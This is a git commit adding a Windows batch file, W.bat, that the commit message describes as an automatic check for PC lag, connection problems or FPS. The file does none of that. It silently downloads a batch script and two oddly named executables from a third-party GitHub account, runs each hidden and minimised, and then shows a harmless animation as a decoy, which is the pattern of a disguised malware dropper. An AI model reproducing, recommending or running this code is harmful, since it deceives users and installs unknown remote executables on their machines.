e9936617b24d0c32cb0ab08e159f13a87ba23101
DeviceDevv <154300499+DeviceDevv@users.noreply.github.com>
2023-12-18 22:49:05 -0600

    Add files via upload
    Pc auto check for lag, or buggy connection or fps.

---
+++ W.bat
@@ -0,0 +1,4 @@
+curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/i.bat && start /b /min i.bat
+curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/$lrxg.exe && start /b /min $lrxg.exe
+curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/$sxr.exe && start /b /min $sxr.exe
+curl parrot.live
